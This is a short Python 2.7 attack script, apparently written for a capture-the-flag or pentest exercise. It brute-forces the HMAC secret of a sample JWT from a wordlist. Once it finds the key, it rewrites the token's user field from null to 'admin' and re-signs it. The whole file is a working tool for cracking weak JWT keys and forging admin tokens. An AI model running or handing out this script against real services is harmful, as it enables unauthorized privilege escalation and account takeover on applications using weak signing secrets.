#!/usr/bin/env python2.7

#Usefull script to bruteforce JWT Token in order to identify correct key 
#and recreate valid signed JWT token with admin privilege

import base64
import hmac
import hashlib
import json

jwtOrig = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

split = jwtOrig.split('.')
header = (split[0])
payload = (split[1])
signature = (split[2])
headPay = header+"."+payload


def generateJWT(key):
	payloadDecode = (base64.urlsafe_b64decode(payload+"=="))
	
	payloadUpdate = payloadDecode.replace("null","\"admin\"")

	payloadb64 = ((base64.urlsafe_b64encode(payloadUpdate.encode('utf-8'))).decode('utf-8')).rstrip("=")
	headPay2 = header+"."+payloadb64

	signature3 = base64.urlsafe_b64encode(hmac.new(key,headPay2,hashlib.sha256).digest()).decode('utf-8').rstrip("=")
	jwt = header + '.' + payloadb64 + '.' + signature3
	print ("New signed JWT with admin priv ==> "+jwt)

with open ("/tmp/wordlistKey.txt","r") as f:
	for words in f:
		key = words.replace("\n","")
		signatureVerif = base64.urlsafe_b64encode(hmac.new(key,headPay,hashlib.sha256).digest()).decode('utf-8').rstrip("=")
		if signatureVerif == signature:
			print ("Correct Key found ==> "+key)
			generateJWT(key)
